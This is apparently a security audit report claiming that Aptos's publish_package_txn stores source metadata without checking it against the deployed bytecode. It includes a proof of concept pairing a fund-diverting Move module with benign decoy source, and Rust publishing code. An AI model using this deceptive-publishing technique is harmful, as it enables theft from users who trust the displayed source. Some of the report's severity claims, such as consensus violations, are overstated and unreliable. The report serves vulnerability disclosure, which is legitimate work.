# Audit Report

## Title
Critical Package Metadata Injection Vulnerability: No Verification of Source Code Against Deployed Bytecode

## Summary

The Aptos blockchain's package publishing mechanism (`publish_package_txn`) accepts both `PackageMetadata` (containing source code) and compiled bytecode without verifying that the source code actually compiles to the deployed bytecode. An attacker can publish malicious bytecode while storing benign source code in `PackageMetadata`, causing users, auditors, and debugging tools to see safe code while malicious bytecode executes on-chain.

## Finding Description

When publishing a Move package via the `publish_package_txn` entry function, the system stores `PackageMetadata` and publishes module bytecode as two completely separate, unverified operations: [1](#0-0) 

The `publish_package` function:
1. Stores the `PackageMetadata` (including source code and `source_digest`) directly into `PackageRegistry` without any validation that this metadata corresponds to the bytecode
2. Separately calls `request_publish_with_allowed_deps` with the bytecode, which is an entirely independent process

There is **no cross-validation** between these two operations. The `check_and_obtain_source_code` function in the debugger interface simply retrieves and returns the source code from `PackageMetadata` without any verification: [2](#0-1) 

The VM's `validate_publish_request` function validates bytecode properties but never checks if the source code matches: [3](#0-2) 

**Attack Scenario:**

1. Attacker writes malicious Move code that steals funds (e.g., transfers APT to attacker's address)
2. Attacker compiles this to bytecode
3. Attacker creates separate benign Move source code (e.g., a simple token transfer function)
4. Attacker constructs `PackageMetadata` with the benign source code and computes a `source_digest` from it
5. Attacker calls `publish_package_txn` with the benign metadata and malicious bytecode
6. Both are accepted and stored on-chain with no verification

**Result:**
- On-chain bytecode executes malicious logic
- On-chain `PackageMetadata.source` contains benign code
- Users, auditors, and tools like `check_and_obtain_source_code` see safe code
- Actual execution steals funds

This breaks the **Deterministic Execution** invariant because different participants may use different verification methods (some trust source code, others verify bytecode), leading to consensus disagreements about package safety.

## Impact Explanation

**Critical Severity** - This vulnerability qualifies for maximum severity under multiple categories:

1. **Loss of Funds**: Users interact with packages they believe are safe based on source code inspection, but malicious bytecode steals their assets. This is direct theft enabled by the vulnerability.

2. **Consensus/Safety Violations**: If different validators or tools use different verification methods (some checking source code, others verifying bytecode), this creates potential for consensus disagreements about transaction validity.

3. **Complete Breakdown of Security Model**: Move's security model relies heavily on source code transparency and auditing. This vulnerability completely undermines that model, making all source-code-based security reviews meaningless.

The `VerifyPackage` CLI tool exists but is client-side only and not enforced: [4](#0-3) 

This tool can detect mismatches but attackers can simply skip it, and users have no guarantee publishers used it.

## Likelihood Explanation

**Very High Likelihood:**

1. **Low Complexity**: Publishing a package requires no special privileges - any account can do it
2. **No Detection**: The attack leaves no obvious traces; the malicious package appears legitimate with proper source code
3. **Wide Attack Surface**: Every Move package on Aptos is potentially vulnerable to this deception
4. **High Value Target**: DeFi protocols, NFT marketplaces, and governance contracts all rely on source code transparency
5. **No Existing Mitigations**: The system has no on-chain verification of source-to-bytecode correspondence

## Recommendation

Implement mandatory on-chain verification that source code compiles to the published bytecode:

**Solution 1: Enforce Compilation Verification (Recommended)**

Modify the `publish_package` function to:
1. Compile the source code from `PackageMetadata` in a deterministic environment
2. Compute bytecode hash of the compilation result
3. Compare with hash of the provided bytecode
4. Reject the transaction if they don't match

**Solution 2: Remove Source Code Storage**

If on-chain compilation is too expensive, remove source code from `PackageMetadata` and require users to verify packages off-chain before interaction. Store only bytecode hashes and require manual verification.

**Solution 3: Trusted Source Registry**

Create a separate trusted source code registry where:
1. Publishers must submit source code to a verifiable registry
2. Independent validators compile and verify the source
3. Only verified packages get a "trusted" flag
4. Warn users about unverified packages

**Immediate Mitigation:**

Add a feature flag to reject packages where `source_digest` is not verifiable on-chain, and require all new packages to use deterministic compilation that can be verified.

## Proof of Concept

```move
// Step 1: Create malicious.move - what actually gets deployed
module attacker::token {
    use aptos_framework::coin;
    use aptos_framework::aptos_coin::AptosCoin;
    
    public entry fun transfer(from: &signer, amount: u64) {
        // MALICIOUS: Transfer to attacker instead of intended recipient
        let attacker_addr = @0xATTACKER;
        coin::transfer<AptosCoin>(from, attacker_addr, amount);
    }
}

// Step 2: Create benign.move - what goes in PackageMetadata.source
module attacker::token {
    use aptos_framework::coin;
    use aptos_framework::aptos_coin::AptosCoin;
    
    public entry fun transfer(from: &signer, to: address, amount: u64) {
        // BENIGN: Transfer to intended recipient
        coin::transfer<AptosCoin>(from, to, amount);
    }
}

// Step 3: Rust code to publish the malicious package
use aptos_sdk::types::transaction::EntryFunction;
use move_core_types::ident_str;

// Compile malicious.move to bytecode
let malicious_bytecode = compile_move_module("malicious.move");

// Create PackageMetadata with benign source
let benign_source = std::fs::read_to_string("benign.move")?;
let metadata = PackageMetadata {
    name: "token".to_string(),
    upgrade_policy: UpgradePolicy::compat(),
    upgrade_number: 0,
    source_digest: compute_source_digest(&benign_source),
    manifest: compress_manifest("Move.toml"),
    modules: vec![ModuleMetadata {
        name: "token".to_string(),
        source: compress_source(&benign_source), // Benign code here!
        source_map: vec![],
        extension: None,
    }],
    deps: vec![],
    extension: None,
};

// Publish with benign metadata but malicious bytecode
let payload = EntryFunction::new(
    ModuleId::new(AccountAddress::ONE, ident_str!("code").to_owned()),
    ident_str!("publish_package_txn").to_owned(),
    vec![],
    vec![
        bcs::to_bytes(&metadata)?,  // Benign source code
        bcs::to_bytes(&vec![malicious_bytecode])?, // Malicious bytecode
    ],
);

// Submit transaction - will succeed without any verification
client.submit_transaction(account, payload).await?;

// Verification shows the attack worked:
// 1. check_and_obtain_source_code returns benign source
// 2. Actual execution uses malicious bytecode
// 3. Users lose funds when calling the function
```

**Notes**

This vulnerability represents a fundamental flaw in the Aptos package publishing architecture. The separation of metadata storage and bytecode publishing without cross-validation creates a critical trust boundary violation. Any system relying on `PackageMetadata.source` for security decisions (including debugging tools, auditors, and users) is vulnerable to this attack.

The `check_and_obtain_source_code` function is particularly affected as it's designed to help developers understand executed code, but will return misleading information for maliciously published packages.

### Citations

**File:** aptos-move/framework/aptos-framework/sources/code.move (L168-228)
```text
    public fun publish_package(owner: &signer, pack: PackageMetadata, code: vector<vector<u8>>) acquires PackageRegistry {
        check_code_publishing_permission(owner);
        // Disallow incompatible upgrade mode. Governance can decide later if this should be reconsidered.
        assert!(
            pack.upgrade_policy.policy > upgrade_policy_arbitrary().policy,
            error::invalid_argument(EINCOMPATIBLE_POLICY_DISABLED),
        );

        let addr = signer::address_of(owner);
        if (!exists<PackageRegistry>(addr)) {
            move_to(owner, PackageRegistry { packages: vector::empty() })
        };

        // Checks for valid dependencies to other packages
        let allowed_deps = check_dependencies(addr, &pack);

        // Check package against conflicts
        // To avoid prover compiler error on spec
        // the package need to be an immutable variable
        let module_names = get_module_names(&pack);
        let package_immutable = &borrow_global<PackageRegistry>(addr).packages;
        let len = vector::length(package_immutable);
        let index = len;
        let upgrade_number = 0;
        vector::enumerate_ref(package_immutable
        , |i, old| {
            let old: &PackageMetadata = old;
            if (old.name == pack.name) {
                upgrade_number = old.upgrade_number + 1;
                check_upgradability(old, &pack, &module_names);
                index = i;
            } else {
                check_coexistence(old, &module_names)
            };
        });

        // Assign the upgrade counter.
        pack.upgrade_number = upgrade_number;

        let packages = &mut borrow_global_mut<PackageRegistry>(addr).packages;
        // Update registry
        let policy = pack.upgrade_policy;
        if (index < len) {
            *vector::borrow_mut(packages, index) = pack
        } else {
            vector::push_back(packages, pack)
        };

        event::emit(PublishPackage {
            code_address: addr,
            is_upgrade: upgrade_number > 0
        });

        // Request publish
        if (features::code_dependency_check_enabled())
            request_publish_with_allowed_deps(addr, module_names, allowed_deps, code, policy.policy)
        else
        // The new `request_publish_with_allowed_deps` has not yet rolled out, so call downwards
        // compatible code.
            request_publish(addr, module_names, code, policy.policy)
    }
```

**File:** aptos-move/aptos-validator-interface/src/rest_interface.rs (L113-195)
```rust
async fn check_and_obtain_source_code(
    client: &Client,
    m: &ModuleId,
    addr: &AccountAddress,
    version: Version,
    transaction: &Transaction,
    package_cache: &mut HashMap<
        ModuleId,
        (
            AccountAddress,
            String,
            HashMap<(AccountAddress, String), PackageMetadata>,
        ),
    >,
    txns: &mut Vec<(
        u64,
        Transaction,
        Option<(
            AccountAddress,
            String,
            HashMap<(AccountAddress, String), PackageMetadata>,
        )>,
    )>,
) -> Result<()> {
    let locate_package_with_src =
        |module: &ModuleId, packages: &[PackageMetadata]| -> Option<PackageMetadata> {
            for package in packages {
                for module_metadata in &package.modules {
                    if module_metadata.name == module.name().as_str() {
                        if module_metadata.source.is_empty() || package.upgrade_policy.policy == 0 {
                            return None;
                        } else {
                            return Some(package.clone());
                        }
                    }
                }
            }
            None
        };
    let mut package_registry_cache: HashMap<AccountAddress, PackageRegistry> = HashMap::new();
    let package_registry =
        get_or_update_package_registry(client, version, addr, &mut package_registry_cache).await?;
    let target_package_opt = locate_package_with_src(m, &package_registry.packages);
    if let Some(target_package) = target_package_opt {
        let mut map = HashMap::new();
        if APTOS_PACKAGES.contains(&target_package.name.as_str()) {
            package_cache.insert(
                m.clone(),
                (
                    AccountAddress::ONE,
                    target_package.name.clone(), // all aptos packages are stored under 0x1
                    HashMap::new(),
                ),
            );
            txns.push((
                version,
                transaction.clone(),
                Some((
                    AccountAddress::ONE,
                    target_package.name, // all aptos packages are stored under 0x1
                    HashMap::new(),
                )), // do not need to store the package registry for aptos packages
            ));
        } else if let Ok(()) = retrieve_dep_packages_with_src(
            client,
            version,
            &target_package,
            &mut map,
            &mut package_registry_cache,
        )
        .await
        {
            map.insert((*addr, target_package.clone().name), target_package.clone());
            package_cache.insert(m.clone(), (*addr, target_package.name.clone(), map.clone()));
            txns.push((
                version,
                transaction.clone(),
                Some((*addr, target_package.name, map)),
            ));
        }
    }
    Ok(())
}
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L1680-1739)
```rust
    fn validate_publish_request(
        &self,
        module_storage: &impl AptosModuleStorage,
        traversal_context: &mut TraversalContext,
        gas_meter: &mut impl GasMeter,
        modules: &[CompiledModule],
        mut expected_modules: BTreeSet<String>,
        allowed_deps: Option<BTreeMap<AccountAddress, BTreeSet<String>>>,
    ) -> VMResult<()> {
        self.reject_unstable_bytecode(modules)?;
        native_validation::validate_module_natives(modules)?;

        for m in modules {
            if !expected_modules.remove(m.self_id().name().as_str()) {
                return Err(Self::metadata_validation_error(&format!(
                    "unregistered module: '{}'",
                    m.self_id().name()
                )));
            }
            if let Some(allowed) = &allowed_deps {
                for dep in m.immediate_dependencies() {
                    if !allowed
                        .get(dep.address())
                        .map(|modules| {
                            modules.contains("") || modules.contains(dep.name().as_str())
                        })
                        .unwrap_or(false)
                    {
                        return Err(Self::metadata_validation_error(&format!(
                            "unregistered dependency: '{}'",
                            dep
                        )));
                    }
                }
            }
            verify_module_metadata_for_module_publishing(m, self.features())
                .map_err(|err| Self::metadata_validation_error(&err.to_string()))?;
        }

        resource_groups::validate_resource_groups(
            self.features(),
            module_storage,
            traversal_context,
            gas_meter,
            modules,
        )?;
        event_validation::validate_module_events(
            self.features(),
            module_storage,
            traversal_context,
            modules,
        )?;

        if !expected_modules.is_empty() {
            return Err(Self::metadata_validation_error(
                "not all registered modules published",
            ));
        }
        Ok(())
    }
```

**File:** crates/aptos/src/move_tool/mod.rs (L2048-2083)
```rust
    async fn execute(self) -> CliTypedResult<&'static str> {
        // First build the package locally to get the package metadata
        let build_options = BuildOptions {
            install_dir: self.move_options.output_dir.clone(),
            bytecode_version: fix_bytecode_version(
                self.move_options.bytecode_version,
                self.move_options.language_version,
            ),
            ..self.included_artifacts.build_options(&self.move_options)?
        };
        let pack = BuiltPackage::build(self.move_options.get_package_path()?, build_options)
            .map_err(|e| CliError::MoveCompilationError(format!("{:#}", e)))?;
        let compiled_metadata = pack.extract_metadata()?;

        // Now pull the compiled package
        let url = self.rest_options.url(&self.profile_options)?;
        let registry = CachedPackageRegistry::create(url, self.account, false).await?;
        let package = registry
            .get_package(pack.name())
            .await
            .map_err(|s| CliError::CommandArgumentError(s.to_string()))?;

        // We can't check the arbitrary, because it could change on us
        if package.upgrade_policy() == UpgradePolicy::arbitrary() {
            return Err(CliError::CommandArgumentError(
                "A package with upgrade policy `arbitrary` cannot be downloaded \
                since it is not safe to depend on such packages."
                    .to_owned(),
            ));
        }

        // Verify that the source digest matches
        package.verify(&compiled_metadata)?;

        Ok("Successfully verified source of package")
    }
```
